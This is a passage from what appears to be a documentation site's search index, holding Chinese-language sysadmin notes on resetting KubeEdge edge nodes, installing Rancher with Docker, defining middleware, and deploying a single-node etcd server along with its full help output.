\u5176\u5b9e\u4e0a\u9762arch=$(uname -m)\u5f00\u5934\u7684\u547d\u4ee4\uff0c\u662f\u8fde\u63a5[cloudcore]\u670d\u52a1\uff0c\u5728\u9875\u9762\u4e2d\u67e5\u770bcloudcore\u662fnodeport\u7684\u5f62\u5f0f\u63d0\u4f9b\u7684\uff0c\u6620\u5c04\u90fd\u662f30000\u540e\u7684\u7aef\u53e3\u53f7\uff0c\u6240\u4ee5\u9700\u8981\u6539\u4e0b\uff0c\u800c kubeedge.cloudCore.cloudHub.advertiseAddress \u5219\u5e94\u8be5\u662fcloudcore\u670d\u52a1\u7684IP\u5730\u5740\uff0c\u4ed6\u4eec\u662f\u4e00\u4e2aIP\u5730\u5740\uff0call-in-one\u6a21\u5f0f\u4e0b\u53ea\u6709\u4e00\u4e2aIP\u5730\u5740\uff0c\u5982\u679c\u5728\u516c\u7f51\u4e0b\uff0ccloudcore\u5e94\u8be5\u662fSLB\u6216\u8005\u516c\u7f51\u5730\u5740\u624d\u884c","title":"\u6dfb\u52a0\u8fb9\u7f18\u8282\u70b9"},{"location":"lxc/kubesphere/kubesphere/#_3","text":"\u5982\u679c\u8be5\u8fb9\u7f18\u8282\u70b9\u9700\u8981\u91cd\u7f6e\uff0c\u9700\u8981\u5982\u4e0b\u64cd\u4f5c\u3002 ./keadm reset yum remove mosquitto rm -rf /var/lib/kubeedge /var/lib/edged /etc/kubeedge/ca /etc/kubeedge/certs rm -rf /etc/systemd/system/edgecore.service","title":"\u8fb9\u7f18\u8282\u70b9\u91cd\u7f6e"},{"location":"lxc/kubesphere/kubesphere/#_4","text":"\u5728\u96c6\u7fa4\u7684\u673a\u5668\u4e0a\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c \u662f\u9875\u9762\u4e0a\u7684\u8fb9\u7f18\u8282\u70b9\u7684\u540d\u5b57 kubectl delete node <edgenode-name> \u8bbe\u7f6e\u516c\u5f00\u96c6\u7fa4\uff0c\u5728\u96c6\u7fa4\u7684 \u96c6\u7fa4\u8bbe\u7f6e \u4e2d\uff0c \u96c6\u7fa4\u53ef\u89c1\u6027 \u4e2d\uff0c \u7f16\u8f91\u53ef\u89c1\u6027 \uff0c\u62c9\u5230\u6700\u5e95\u90e8\uff0c\u6709\u4e2a \u8bbe\u7f6e\u4e3a\u516c\u5f00\u96c6\u7fa4 \u7684\u5f00\u5173\u6253\u5f00\u3002 \u521b\u5efa\u4f01\u4e1a\u7a7a\u95f4\u53ca\u76f8\u5173\u7528\u6237 https://kubesphere.com.cn/docs/quick-start/create-workspace-and-project/ \u5bfc\u5165HELM\u4ed3\u5e93 https://kubesphere.com.cn/docs/workspace-administration/app-repository/import-helm-repository/","title":"\u5220\u9664\u8fb9\u7f18\u8282\u70b9"},{"location":"lxc/rancher/rancher_instatll/","text":"rancher\u5b89\u88c5 \u7248\u672c2.6.3 [root@server ~] yum install -y yum-utils device-mapper-persistent-data lvm2 wget [root@server ~] yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo [root@server ~] yum makecache fast [root@server ~] yum install docker-ce-19.03.15-3.el7 docker-ce-cli-19.03.15-3.el7 -y [root@server ~] systemctl enable docker && systemctl restart docker [root@server ~] sudo docker run -d --restart=unless-stopped --privileged -p 80:80 -p 443:443 rancher/rancher \u8bbf\u95ee \u672c\u673a80\u7aef\u53e3","title":"Rancher\u5b89\u88c5"},{"location":"lxc/rancher/rancher_instatll/#rancher","text":"\u7248\u672c2.6.3 [root@server ~] yum install -y yum-utils device-mapper-persistent-data lvm2 wget [root@server ~] yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo [root@server ~] yum makecache fast [root@server ~] yum install docker-ce-19.03.15-3.el7 docker-ce-cli-19.03.15-3.el7 -y [root@server ~] systemctl enable docker && systemctl restart docker [root@server ~] sudo docker run -d --restart=unless-stopped --privileged -p 80:80 -p 443:443 rancher/rancher \u8bbf\u95ee \u672c\u673a80\u7aef\u53e3","title":"rancher\u5b89\u88c5"},{"location":"middleware/","text":"\u4e2d\u95f4\u4ef6 \u4e2d\u95f4\u4ef6 \uff08\u82f1\u8bed\uff1aMiddleware\uff09\uff0c\u53c8\u8bd1 \u4e2d\u95f4\u4ef6\u3001\u4e2d\u4ecb\u5c42 \uff0c\u662f\u4e00\u7c7b\u63d0\u4f9b \u7cfb\u7edf\u8f6f\u4ef6 \u548c \u5e94\u7528\u8f6f\u4ef6 \u4e4b\u95f4\u8fde\u63a5\u3001\u4fbf\u4e8e \u8f6f\u4ef6 \u5404\u90e8\u4ef6\u4e4b\u95f4\u7684\u6c9f\u901a\u7684\u8f6f\u4ef6\uff0c\u5e94\u7528\u8f6f\u4ef6\u53ef\u4ee5\u501f\u52a9\u4e2d\u95f4\u4ef6\u5728\u4e0d\u540c\u7684\u6280\u672f\u67b6\u6784\u4e4b\u95f4\u5171\u4eab\u4fe1\u606f\u4e0e\u8d44\u6e90\u3002\u4e2d\u95f4\u4ef6\u4f4d\u4e8e\u5ba2\u6237\u673a\u670d\u52a1\u5668\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e4b\u4e0a\uff0c\u7ba1\u7406\u7740\u8ba1\u7b97\u8d44\u6e90\u548c\u7f51\u7edc\u901a\u4fe1\u3002 \u4e2d\u95f4\u4ef6\u5728\u73b0\u4ee3\u4fe1\u606f\u6280\u672f\u5e94\u7528\u6846\u67b6\u5982 Web\u670d\u52a1 \u3001 \u9762\u5411\u670d\u52a1\u7684\u4f53\u7cfb\u7ed3\u6784 \u7b49\u4e2d\u5e94\u7528\u6bd4\u8f83\u5e7f\u6cdb\uff0c\u5982 \u6570\u636e\u5e93 \u3001Apache\u7684Tomcat\uff0cIBM\u516c\u53f8\u7684WebSphere,BEA\u516c\u53f8\u7684WebLogic \u5e94\u7528\u670d\u52a1\u5668 \uff0c\u91d1\u8776\u7684 Apusic \u7cfb\u5217\u4ea7\u54c1\uff0c\u4e1c\u65b9\u901a\u7684 Tong \u7cfb\u5217\u4e2d\u95f4\u4ef6\u7b49\u90fd\u5c5e\u4e8e\u4e2d\u95f4\u4ef6\u3002 \u4e25\u683c\u6765\u8bb2\uff0c\u4e2d\u95f4\u4ef6\u6280\u672f\u5df2\u7ecf\u4e0d\u5c40\u9650\u4e8e\u5e94\u7528\u670d\u52a1\u5668\u3001\u6570\u636e\u5e93\u670d\u52a1\u5668\u3002\u56f4\u7ed5\u4e2d\u95f4\u4ef6\uff0cApache\u7ec4\u7ec7\u3001IBM\u3001Oracle\uff08BEA\uff09\u3001\u5fae\u8f6f\u5404\u81ea\u53d1\u5c55\u51fa\u4e86\u8f83\u4e3a\u5b8c\u6574\u7684\u8f6f\u4ef6\u4ea7\u54c1\u4f53\u7cfb\u3002\uff08 Microsoft Servers \u5fae\u8f6f\u516c\u53f8\u7684\u670d\u52a1\u5668\u4ea7\u54c1\uff09\u3002 \u76ee\u524d\u4e3b\u6d41\u64cd\u4f5c\u7cfb\u7edf\u4e3b\u8981\u4e3a Unix \u3001 Linux \u3001 \u82f9\u679c\u516c\u53f8 \u7684\u7cfb\u7edf\u4ee5\u53ca \u5fae\u8f6f \u89c6\u7a97\u7cfb\u5217\u3002 \u5fae\u8f6f \u9635\u8425\u7684\u4e3b\u8981\u6280\u672f\u63d0\u4f9b\u5546\u6765\u81ea\u5fae\u8f6f\u53ca\u5176\u5546\u4e1a\u4f19\u4f34\uff0c Java \u9635\u8425\u5219\u6765\u81ea IBM \u3001 Sun \uff08\u5df2\u88abOracle\u6536\u8d2d\uff09\u3001 Oracle \u3001 BEA \uff08\u5df2\u88abOracle\u6536\u8d2d\uff09\u3001\u4e1c\u65b9\u901a\uff08Tong\u7cfb\u5217\u4e2d\u95f4\u4ef6\uff09\u3001\u91d1\u8776\uff08Kingdee Apusic\uff09\u53ca\u5176\u5408\u4f5c\u4f19\u4f34\uff0c \u5f00\u6e90 \u9635\u8425\u5219\u4e3b\u8981\u6765\u81ea\u8bf8\u5982Apache\uff0cSourceForge\u7b49\u7ec4\u7ec7\u7684\u5171\u4eab\u4ee3\u7801\u3002 \u4e2d\u95f4\u4ef6 - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org)","title":"\u4e2d\u95f4\u4ef6"},{"location":"middleware/#_1","text":"\u4e2d\u95f4\u4ef6 \uff08\u82f1\u8bed\uff1aMiddleware\uff09\uff0c\u53c8\u8bd1 \u4e2d\u95f4\u4ef6\u3001\u4e2d\u4ecb\u5c42 \uff0c\u662f\u4e00\u7c7b\u63d0\u4f9b \u7cfb\u7edf\u8f6f\u4ef6 \u548c \u5e94\u7528\u8f6f\u4ef6 \u4e4b\u95f4\u8fde\u63a5\u3001\u4fbf\u4e8e \u8f6f\u4ef6 \u5404\u90e8\u4ef6\u4e4b\u95f4\u7684\u6c9f\u901a\u7684\u8f6f\u4ef6\uff0c\u5e94\u7528\u8f6f\u4ef6\u53ef\u4ee5\u501f\u52a9\u4e2d\u95f4\u4ef6\u5728\u4e0d\u540c\u7684\u6280\u672f\u67b6\u6784\u4e4b\u95f4\u5171\u4eab\u4fe1\u606f\u4e0e\u8d44\u6e90\u3002\u4e2d\u95f4\u4ef6\u4f4d\u4e8e\u5ba2\u6237\u673a\u670d\u52a1\u5668\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e4b\u4e0a\uff0c\u7ba1\u7406\u7740\u8ba1\u7b97\u8d44\u6e90\u548c\u7f51\u7edc\u901a\u4fe1\u3002 \u4e2d\u95f4\u4ef6\u5728\u73b0\u4ee3\u4fe1\u606f\u6280\u672f\u5e94\u7528\u6846\u67b6\u5982 Web\u670d\u52a1 \u3001 \u9762\u5411\u670d\u52a1\u7684\u4f53\u7cfb\u7ed3\u6784 \u7b49\u4e2d\u5e94\u7528\u6bd4\u8f83\u5e7f\u6cdb\uff0c\u5982 \u6570\u636e\u5e93 \u3001Apache\u7684Tomcat\uff0cIBM\u516c\u53f8\u7684WebSphere,BEA\u516c\u53f8\u7684WebLogic \u5e94\u7528\u670d\u52a1\u5668 \uff0c\u91d1\u8776\u7684 Apusic \u7cfb\u5217\u4ea7\u54c1\uff0c\u4e1c\u65b9\u901a\u7684 Tong \u7cfb\u5217\u4e2d\u95f4\u4ef6\u7b49\u90fd\u5c5e\u4e8e\u4e2d\u95f4\u4ef6\u3002 \u4e25\u683c\u6765\u8bb2\uff0c\u4e2d\u95f4\u4ef6\u6280\u672f\u5df2\u7ecf\u4e0d\u5c40\u9650\u4e8e\u5e94\u7528\u670d\u52a1\u5668\u3001\u6570\u636e\u5e93\u670d\u52a1\u5668\u3002\u56f4\u7ed5\u4e2d\u95f4\u4ef6\uff0cApache\u7ec4\u7ec7\u3001IBM\u3001Oracle\uff08BEA\uff09\u3001\u5fae\u8f6f\u5404\u81ea\u53d1\u5c55\u51fa\u4e86\u8f83\u4e3a\u5b8c\u6574\u7684\u8f6f\u4ef6\u4ea7\u54c1\u4f53\u7cfb\u3002\uff08 Microsoft Servers \u5fae\u8f6f\u516c\u53f8\u7684\u670d\u52a1\u5668\u4ea7\u54c1\uff09\u3002 \u76ee\u524d\u4e3b\u6d41\u64cd\u4f5c\u7cfb\u7edf\u4e3b\u8981\u4e3a Unix \u3001 Linux \u3001 \u82f9\u679c\u516c\u53f8 \u7684\u7cfb\u7edf\u4ee5\u53ca \u5fae\u8f6f \u89c6\u7a97\u7cfb\u5217\u3002 \u5fae\u8f6f \u9635\u8425\u7684\u4e3b\u8981\u6280\u672f\u63d0\u4f9b\u5546\u6765\u81ea\u5fae\u8f6f\u53ca\u5176\u5546\u4e1a\u4f19\u4f34\uff0c Java \u9635\u8425\u5219\u6765\u81ea IBM \u3001 Sun \uff08\u5df2\u88abOracle\u6536\u8d2d\uff09\u3001 Oracle \u3001 BEA \uff08\u5df2\u88abOracle\u6536\u8d2d\uff09\u3001\u4e1c\u65b9\u901a\uff08Tong\u7cfb\u5217\u4e2d\u95f4\u4ef6\uff09\u3001\u91d1\u8776\uff08Kingdee Apusic\uff09\u53ca\u5176\u5408\u4f5c\u4f19\u4f34\uff0c \u5f00\u6e90 \u9635\u8425\u5219\u4e3b\u8981\u6765\u81ea\u8bf8\u5982Apache\uff0cSourceForge\u7b49\u7ec4\u7ec7\u7684\u5171\u4eab\u4ee3\u7801\u3002 \u4e2d\u95f4\u4ef6 - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org)","title":"\u4e2d\u95f4\u4ef6"},{"location":"middleware/etcd/etcd/","text":"Etcd \u5355\u673a\u90e8\u7f72 \u670d\u52a1\u7aef \u4e3b\u673a\u540d etcd\u7248\u672c IP\u5730\u5740 etcd v3.4.13 192.168.70.132 \u4e0b\u8f7d\u5730\u5740: https://github.com/etcd-io/etcd/releases/tag/v3.4.13 [root@etcd ~]# tar -zxvf etcd-v3.4.13-linux-amd64.tar.gz [root@centos7 ~]# cd etcd-v3.4.13-linux-amd64 [root@centos7 etcd-v3.4.13-linux-amd64]# nohup ./etcd --advertise-client-urls 'http://0.0.0.0:2379' --listen-client-urls 'http://0.0.0.0:2379' --enable-v2 > etcd.log 2>&1 & --advertise-client-urls --listen-client-urls \u8fd9\u4e24\u4e2a0.0.0.0\u5f00\u5934\u662f\u4e3a\u4e86\u6d4f\u89c8\u5668\u4e5f\u80fd\u8bbf\u95ee\uff0c\u9ed8\u8ba4\u53ea\u80fd\u8bbf\u95ee127.0.0.1 --enable-v2 \u5f00\u542fV2\u7684API \u56e0\u4e3a\u662f\u5355\u673a\u96c6\u7fa4\uff0c\u6240\u4ee5\u5c31\u542f\u52a8\u4e00\u4e2a\u8282\u70b9\u5373\u53ef [root@etcd etcd-v3.4.13-linux-amd64]# ./etcd --version etcd Version: 3.4.13 Git SHA: ae9734ed2 Go Version: go1.12.17 Go OS/Arch: linux/amd64 [root@etcd etcd-v3.4.13-linux-amd64]# ./etcd --help Usage: etcd [flags] Start an etcd server. etcd --version Show the version of etcd. etcd -h | --help Show the help information about etcd. etcd --config-file Path to the server configuration file. Note that if a configuration file is provided, other command line flags and environment variables will be ignored. etcd gateway Run the stateless pass-through etcd TCP connection forwarding proxy. etcd grpc-proxy Run the stateless etcd v3 gRPC L7 reverse proxy. Member: --name 'default' Human-readable name for this member. --data-dir '${name}.etcd' Path to the data directory. --wal-dir '' Path to the dedicated wal directory. --snapshot-count '100000' Number of committed transactions to trigger a snapshot to disk. --heartbeat-interval '100' Time (in milliseconds) of a heartbeat interval. --election-timeout '1000' Time (in milliseconds) for an election to timeout. See tuning documentation for details. --initial-election-tick-advance 'true' Whether to fast-forward initial election ticks on boot for faster election. --listen-peer-urls 'http://localhost:2380' List of URLs to listen on for peer traffic. --listen-client-urls 'http://localhost:2379' List of URLs to listen on for client traffic. --max-snapshots '5' Maximum number of snapshot files to retain (0 is unlimited). --max-wals '5' Maximum number of wal files to retain (0 is unlimited). --quota-backend-bytes '0' Raise alarms when backend size exceeds the given quota (0 defaults to low space quota). --backend-batch-interval '' BackendBatchInterval is the maximum time before commit the backend transaction. --backend-batch-limit '0' BackendBatchLimit is the maximum operations before commit the backend transaction. --max-txn-ops '128' Maximum number of operations permitted in a transaction. --max-request-bytes '1572864' Maximum client request size in bytes the server will accept. --grpc-keepalive-min-time '5s' Minimum duration interval that a client should wait before pinging server. --grpc-keepalive-interval '2h' Frequency duration of server-to-client ping to check if a connection is alive (0 to disable). --grpc-keepalive-timeout '20s' Additional duration of wait before closing a non-responsive connection (0 to disable). Clustering: --initial-advertise-peer-urls 'http://localhost:2380' List of this member's peer URLs to advertise to the rest of the cluster. --initial-cluster 'default=http://localhost:2380' Initial cluster configuration for bootstrapping. --initial-cluster-state 'new' Initial cluster state ('new' or 'existing'). --initial-cluster-token 'etcd-cluster' Initial cluster token for the etcd cluster during bootstrap. Specifying this can protect you from unintended cross-cluster interaction when running multiple clusters. --advertise-client-urls 'http://localhost:2379' List of this member's client URLs to advertise to the public. The client URLs advertised should be accessible to machines that talk to etcd cluster. etcd client libraries parse these URLs to connect to the cluster. --discovery '' Discovery URL used to bootstrap the cluster. --discovery-fallback 'proxy' Expected behavior ('exit' or 'proxy') when discovery services fails. \"proxy\" supports v2 API only. --discovery-proxy '' HTTP proxy to use for traffic to discovery service. --discovery-srv '' DNS srv domain used to bootstrap the cluster. --discovery-srv-name '' Suffix to the dns srv name queried when bootstrapping. --strict-reconfig-check 'true' Reject reconfiguration requests that would cause quorum loss. --pre-vote 'false' Enable to run an additional Raft election phase. --auto-compaction-retention '0' Auto compaction retention length. 0 means disable auto compaction. --auto-compaction-mode 'periodic' Interpret 'auto-compaction-retention' one of: periodic|revision. 'periodic' for duration based retention, defaulting to hours if no time unit is provided (e.g. '5m'). 'revision' for revision number based retention. --enable-v2 'false' Accept etcd V2 client requests. Security: --cert-file '' Path to the client server TLS cert file. --key-file '' Path to the client server TLS key file. --client-cert-auth 'false' Enable client cert authentication. --client-crl-file '' Path to the client certificate revocation list file. --client-cert-allowed-hostname '' Allowed TLS hostname for client cert authentication. --trusted-ca-file '' Path to the client server TLS trusted CA cert file. --auto-tls 'false' Client TLS using generated certificates. --peer-cert-file '' Path to the peer server TLS cert file. --peer-key-file '' Path to the peer server TLS key file. --peer-client-cert-auth 'false' Enable peer client cert authentication. --peer-trusted-ca-file '' Path to the peer server TLS trusted CA file. --peer-cert-allowed-cn '' Required CN for client certs connecting to the peer endpoint. --peer-cert-allowed-hostname '' Allowed TLS hostname for inter peer authentication. --peer-auto-tls 'false' Peer TLS using self-generated certificates if --peer-key-file and --peer-cert-file are not provided. --peer-crl-file '' Path to the peer certificate revocation list file. --cipher-suites '' Comma-separated list of supported TLS cipher suites between client/server and peers (empty will be auto-populated by Go). --cors '*' Comma-separated whitelist of origins for CORS, or cross-origin resource sharing, (empty or * means allow all). --host-whitelist '*' Acceptable hostnames from HTTP client requests, if server is not secure (empty or * means allow all). Auth: --auth-token 'simple' Specify a v3 authentication token type and its options ('simple' or 'jwt'). --bcrypt-cost 10 Specify the cost / strength of the bcrypt algorithm for hashing auth passwords. Valid values are between 4 and 31. --auth-token-ttl 300 Time (in seconds) of the auth-token-ttl. Profiling and Monitoring: --enable-pprof 'false' Enable runtime profiling data via HTTP server. Address is at client URL + \"/debug/pprof/\" --metrics 'basic' Set level of detail for exported metrics, specify 'extensive' to include histogram metrics. --listen-metrics-urls '' List of URLs to listen on for the metrics and health endpoints. Logging: --logger 'capnslog' Specify 'zap' for structured logging or 'capnslog'. [WARN] 'capnslog' will be deprecated in v3.5. --log-outputs 'default' Specify 'stdout' or 'stderr' to skip journald logging even when running under systemd, or list of comma separated output targets. --log-level 'info' Configures log level. Only supports debug, info, warn, error, panic, or fatal. v2 Proxy (to be deprecated in v4): --proxy 'off' Proxy mode setting ('off', 'readonly' or 'on'). --proxy-failure-wait 5000 Time (in milliseconds) an endpoint will be held in a failed state. --proxy-refresh-interval 30000 Time (in milliseconds) of the endpoints refresh interval. --proxy-dial-timeout 1000 Time (in milliseconds) for a dial to timeout. --proxy-write-timeout 5000 Time (in milliseconds) for a write to timeout. --proxy-read-timeout 0 Time (in milliseconds) for a read to timeout. Experimental feature: --experimental-initial-corrupt-check 'false' Enable to check data corruption before serving any client/peer traffic. --experimental-corrupt-check-time '0s' Duration of time between cluster corruption check passes. --experimental-enable-v2v3 '' Serve v2 requests through the v3 backend under a given prefix. --experimental-backend-bbolt-freelist-type 'array' ExperimentalBackendFreelistType specifies the type of freelist that boltdb backend uses(array and map are supported types). --experimental-enable-lease-checkpoint 'false' ExperimentalEnableLeaseCheckpoint enables primary lessor to persist lease remainingTTL to prevent indefinite auto-renewal of long lived leases. --experimental-compaction-batch-limit 1000 ExperimentalCompactionBatchLimit sets the maximum revisions deleted in each compaction batch. --experimental-peer-skip-client-san-verification 'false' Skip verification of SAN field in client certificate for peer connections. --experimental-watch-progress-notify-interval '10m' Duration of periodical watch progress notification. Unsafe feature: --force-new-cluster 'false' Force to create a new one-member cluster. CAUTIOUS with unsafe flag! It may break the guarantees given by the consensus protocol! TO BE DEPRECATED: --debug 'false' Enable debug-level logging for etcd. [WARN] Will be deprecated in v3.5. Use '--log-level=debug' instead. --log-package-levels '' Specify a particular log level for each etcd package (eg: 'etcdmain=CRITICAL,etcdserver=DEBUG'). yum\u5b89\u88c5\u65b9\u6cd5 [root@etcd ~]# yum install -y etcd [root@etcd ~]# systemctl start etcd API\u63a5\u53e3 https://github.com/etcd-io/etcd/blob/6acb3d67fbe131b3b2d5d010e00ec80182be4628/Documentation/v2/api.md \u67e5\u770b\u6240\u6709\u503c\u7684API\u63a5\u53e3 curl http://127.0.0.1:2379/v2/keys {\"action\":\"get\",\"node\":{\"dir\":true}} lucas - \u7528\u4e8e kubernetes etcd3.0 + \u96c6\u7fa4\u7684\u57fa\u4e8e Web \u7684\u952e\u503c\u67e5\u770b\u5668\u3002 etcd-manager - \u73b0\u4ee3\u3001\u9ad8\u6548\u3001\u591a\u5e73\u53f0\u548c\u514d\u8d39\u7684 etcd 3.x GUI \u548c\u5ba2\u6237\u7aef\u5de5\u5177\u3002\u9002\u7528\u4e8e Windows\u3001Linux \u548c Mac\u3002","title":"etcd\u90e8\u7f72"},{"location":"middleware/etcd/etcd/#etcd","text":"","title":"Etcd"},{"location":"middleware/etcd/etcd/#_1","text":"\u670d\u52a1\u7aef \u4e3b\u673a\u540d etcd\u7248\u672c IP\u5730\u5740 etcd v3.4.13 192.168.70.132 \u4e0b\u8f7d\u5730\u5740: https://github.com/etcd-io/etcd/releases/tag/v3.4.13 [root@etcd ~]# tar -zxvf etcd-v3.4.13-linux-amd64.tar.gz [root@centos7 ~]# cd etcd-v3.4.13-linux-amd64 [root@centos7 etcd-v3.4.13-linux-amd64]# nohup ./etcd --advertise-client-urls 'http://0.0.0.0:2379' --listen-client-urls 'http://0.0.0.0:2379' --enable-v2 > etcd.log 2>&1 & --advertise-client-urls --listen-client-urls \u8fd9\u4e24\u4e2a0.0.0.0\u5f00\u5934\u662f\u4e3a\u4e86\u6d4f\u89c8\u5668\u4e5f\u80fd\u8bbf\u95ee\uff0c\u9ed8\u8ba4\u53ea\u80fd\u8bbf\u95ee127.0.0.1 --enable-v2 \u5f00\u542fV2\u7684API \u56e0\u4e3a\u662f\u5355\u673a\u96c6\u7fa4\uff0c\u6240\u4ee5\u5c31\u542f\u52a8\u4e00\u4e2a\u8282\u70b9\u5373\u53ef [root@etcd etcd-v3.4.13-linux-amd64]# ./etcd --version etcd Version: 3.4.13 Git SHA: ae9734ed2 Go Version: go1.12.17 Go OS/Arch: linux/amd64 [root@etcd etcd-v3.4.13-linux-amd64]# ./etcd --help Usage: etcd [flags] Start an etcd server. etcd --version Show the version of etcd. etcd -h | --help Show the help information about etcd. etcd --config-file Path to the server configuration file. Note that if a configuration file is provided, other command line flags and environment variables will be ignored. etcd gateway Run the stateless pass-through etcd TCP connection forwarding proxy. etcd grpc-proxy Run the stateless etcd v3 gRPC L7 reverse proxy. Member: --name 'default' Human-readable name for this member. --data-dir '${name}.etcd' Path to the data directory. --wal-dir '' Path to the dedicated wal directory. --snapshot-count '100000' Number of committed transactions to trigger a snapshot to disk. --heartbeat-interval '100' Time (in milliseconds) of a heartbeat interval. --election-timeout '1000' Time (in milliseconds) for an election to timeout. See tuning documentation for details. --initial-election-tick-advance 'true' Whether to fast-forward initial election ticks on boot for faster election. --listen-peer-urls 'http://localhost:2380' List of URLs to listen on for peer traffic. --listen-client-urls 'http://localhost:2379' List of URLs to listen on for client traffic. --max-snapshots '5' Maximum number of snapshot files to retain (0 is unlimited). --max-wals '5' Maximum number of wal files to retain (0 is unlimited). --quota-backend-bytes '0' Raise alarms when backend size exceeds the given quota (0 defaults to low space quota). --backend-batch-interval '' BackendBatchInterval is the maximum time before commit the backend transaction. --backend-batch-limit '0' BackendBatchLimit is the maximum operations before commit the backend transaction. --max-txn-ops '128' Maximum number of operations permitted in a transaction. --max-request-bytes '1572864' Maximum client request size in bytes the server will accept. --grpc-keepalive-min-time '5s' Minimum duration interval that a client should wait before pinging server. --grpc-keepalive-interval '2h' Frequency duration of server-to-client ping to check if a connection is alive (0 to disable). --grpc-keepalive-timeout '20s' Additional duration of wait before closing a non-responsive connection (0 to disable). Clustering: --initial-advertise-peer-urls 'http://localhost:2380' List of this member's peer URLs to advertise to the rest of the cluster. --initial-cluster 'default=http://localhost:2380' Initial cluster configuration for bootstrapping. --initial-cluster-state 'new' Initial cluster state ('new' or 'existing'). --initial-cluster-token 'etcd-cluster' Initial cluster token for the etcd cluster during bootstrap. Specifying this can protect you from unintended cross-cluster interaction when running multiple clusters. --advertise-client-urls 'http://localhost:2379' List of this member's client URLs to advertise to the public. The client URLs advertised should be accessible to machines that talk to etcd cluster. etcd client libraries parse these URLs to connect to the cluster. --discovery '' Discovery URL used to bootstrap the cluster. --discovery-fallback 'proxy' Expected behavior ('exit' or 'proxy') when discovery services fails. \"proxy\" supports v2 API only. --discovery-proxy '' HTTP proxy to use for traffic to discovery service. --discovery-srv '' DNS srv domain used to bootstrap the cluster. --discovery-srv-name '' Suffix to the dns srv name queried when bootstrapping. --strict-reconfig-check 'true' Reject reconfiguration requests that would cause quorum loss. --pre-vote 'false' Enable to run an additional Raft election phase. --auto-compaction-retention '0' Auto compaction retention length. 0 means disable auto compaction. --auto-compaction-mode 'periodic' Interpret 'auto-compaction-retention' one of: periodic|revision. 'periodic' for duration based retention, defaulting to hours if no time unit is provided (e.g. '5m'). 'revision' for revision number based retention. --enable-v2 'false' Accept etcd V2 client requests. Security: --cert-file '' Path to the client server TLS cert file. --key-file '' Path to the client server TLS key file. --client-cert-auth 'false' Enable client cert authentication. --client-crl-file '' Path to the client certificate revocation list file. --client-cert-allowed-hostname '' Allowed TLS hostname for client cert authentication. --trusted-ca-file '' Path to the client server TLS trusted CA cert file. --auto-tls 'false' Client TLS using generated certificates. --peer-cert-file '' Path to the peer server TLS cert file. --peer-key-file '' Path to the peer server TLS key file. --peer-client-cert-auth 'false' Enable peer client cert authentication. --peer-trusted-ca-file '' Path to the peer server TLS trusted CA file. --peer-cert-allowed-cn '' Required CN for client certs connecting to the peer endpoint. --peer-cert-allowed-hostname '' Allowed TLS hostname for inter peer authentication. --peer-auto-tls 'false' Peer TLS using self-generated certificates if --peer-key-file and --peer-cert-file are not provided. --peer-crl-file '' Path to the peer certificate revocation list file. --cipher-suites '' Comma-separated list of supported TLS cipher suites between client/server and peers (empty will be auto-populated by Go). --cors '*' Comma-separated whitelist of origins for CORS, or cross-origin resource sharing, (empty or * means allow all). --host-whitelist '*' Acceptable hostnames from HTTP client requests, if server is not secure (empty or * means allow all). Auth: --auth-token 'simple' Specify a v3 authentication token type and its options ('simple' or 'jwt'). --bcrypt-cost 10 Specify the cost / strength of the bcrypt algorithm for hashing auth passwords. Valid values are between 4 and 31. --auth-token-ttl 300 Time (in seconds) of the auth-token-ttl. Profiling and Monitoring: --enable-pprof 'false' Enable runtime profiling data via HTTP server. Address is at client URL + \"/debug/pprof/\" --metrics 'basic' Set level of detail for exported metrics, specify 'extensive' to include histogram metrics. --listen-metrics-urls '' List of URLs to listen on for the metrics and health endpoints. Logging: --logger 'capnslog' Specify 'zap' for structured logging or 'capnslog'. [WARN] 'capnslog' will be deprecated in v3.5. --log-outputs 'default' Specify 'stdout' or 'stderr' to skip journald logging even when running under systemd, or list of comma separated output targets. --log-level 'info' Configures log level. Only supports debug, info, warn, error, panic, or fatal. v2 Proxy (to be deprecated in v4): --proxy 'off' Proxy mode setting ('off', 'readonly' or 'on'). --proxy-failure-wait 5000 Time (in milliseconds) an endpoint will be held in a failed state. --proxy-refresh-interval 30000 Time (in milliseconds) of the endpoints refresh interval. --proxy-dial-timeout 1000 Time (in milliseconds) for a dial to timeout. --proxy-write-timeout 5000 Time (in milliseconds) for a write to timeout. --proxy-read-timeout 0 Time (in milliseconds) for a read to timeout. Experimental feature: --experimental-initial-corrupt-check 'false' Enable to check data corruption before serving any client/peer traffic. --experimental-corrupt-check-time '0s' Duration of time between cluster corruption check passes. --experimental-enable-v2v3 '' Serve v2 requests through the v3 backend under a given prefix. --experimental-backend-bbolt-freelist-type 'array' ExperimentalBackendFreelistType specifies the type of freelist that boltdb backend uses(array and map are supported types). --experimental-enable-lease-checkpoint 'false' ExperimentalEnableLeaseCheckpoint enables primary lessor to persist lease remainingTTL to prevent indefinite auto-renewal of long lived leases. --experimental-compaction-batch-limit 1000 ExperimentalCompactionBatchLimit sets the maximum revisions deleted in each compaction batch. --experimental-peer-skip-client-san-verification 'false' Skip verification of SAN field in client certificate for peer connections. --experimental-watch-progress-notify-interval '10m' Duration of periodical watch progress notification. Unsafe feature: --force-new-cluster 'false' Force to create a new one-member cluster. CAUTIOUS with unsafe flag! It may break the guarantees given by the consensus protocol! TO BE DEPRECATED: --debug 'false' Enable debug-level logging for etcd. [WARN] Will be deprecated in v3.5. Use '--log-level=debug' instead. --log-package-levels '' Specify a particular log level for each etcd package (eg: 'etcdmain=CRITICAL,etcdserver=DEBUG'). yum\u5b89\u88c5\u65b9\u6cd5 [root@etcd ~]# yum install -y etcd [root@etcd ~]# systemctl start etcd","title":"\u5355\u673a\u90e8\u7f72"},{"location":"middleware/etcd/etcd/#api","text":"https://github.com/etcd-io/etcd/blob/6acb3d67fbe131b3b2d5d010e00ec80182be4628/Documentation/v2/api.md \u67e5\u770b\u6240\u6709\u503c\u7684API\u63a5\u53e3 curl http://127.0.0.1:2379/v2/keys {\"action\":\"get\",\"node\":{\"dir\":true}} lucas - \u7528\u4e8e kubernetes etcd3.0 + 